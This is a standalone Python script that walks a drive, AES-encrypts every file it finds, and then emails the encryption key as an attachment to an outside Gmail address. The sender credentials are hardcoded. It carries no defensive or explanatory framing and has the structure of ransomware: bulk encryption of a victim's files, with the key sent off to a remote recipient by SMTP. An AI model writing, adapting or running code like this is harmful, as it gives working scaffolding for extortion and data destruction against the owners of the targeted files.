import os
import smtplib
import hashlib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from Crypto import Random
from Crypto.Cipher import AES

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    """Encrypts a file using AES (CBC mode) with the given key."""
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = Random.new().read(AES.block_size)
    encryptor = AES.new(key, AES.MODE_CBC, iv)

    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(filesize.to_bytes(8, byteorder='big'))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def encrypt_drive(key, drive_path):
    """Encrypts all files on a drive using AES (CBC mode) with the given key."""
    for root, dirs, files in os.walk(drive_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(key, file_path)

if __name__ == '__main__':
    key = hashlib.sha256(b"my_secret_key").digest()  # Change this to your secret key
    drive_path = "/path/to/drive"  # Change this to the path of the drive you want to encrypt
    encrypt_drive(key, drive_path)

    # Set up email parameters
    sender_email = "chinnymonke@gmail.com"
    sender_password = "monkeydog123"
    recipient_email = "bananaankles@gmail.com"
    subject = "Decryption key for encrypted files"
    message = "Please find the decryption key attached."

    # Generate and attach decryption key
    key_attachment = MIMEApplication(key, _subtype='octet-stream')
    key_attachment.add_header('Content-Disposition', 'attachment', filename='key.bin')

    # Create email message with attachments
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message))
    msg.attach(key_attachment)

    # Connect to SMTP server and send email
    with smtplib.SMTP('smtp.gmail.com', 587) as smtp_server:
        smtp_server.ehlo()
        smtp_server.starttls()
        smtp_server.login(sender_email, sender_password)
        smtp_server.send_message(msg)
        smtp_server
